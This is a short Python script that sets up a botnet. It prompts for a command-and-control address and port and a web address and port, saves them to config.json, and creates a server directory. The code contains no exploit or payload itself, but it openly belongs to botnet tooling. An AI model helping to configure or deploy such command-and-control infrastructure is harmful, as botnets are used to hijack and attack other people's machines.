import os
import json

def setup():
    print("[*] WELCOME TO BOTNET SETUP")

    if os.name != "posix":
        print("[-] Error, this program must be run on a linux machine")
        exit()

    cnc_address_input = input("[+] Select CNC adddress: ")
    cnc_port_input = input("[+] Select CNC port: ")
    web_address_input = input("[+] Select WEB adddress: ")
    web_port_input = input("[+] Select WEB port: ")

    try:
        config = {
            "cnc_address": cnc_address_input,
            "cnc_port": int(cnc_port_input),
            "web_address": web_address_input,
            "web_port": int(web_port_input)
        }
    except:
        print("[-] Error, CNC or WEB port is not an integer")
        exit()

    with open('config.json', 'w', encoding='utf-8') as f:
        json.dump(config, f, ensure_ascii=False, indent=4)

    os.mkdir("server/public")

if __name__ == "__main__":
    setup()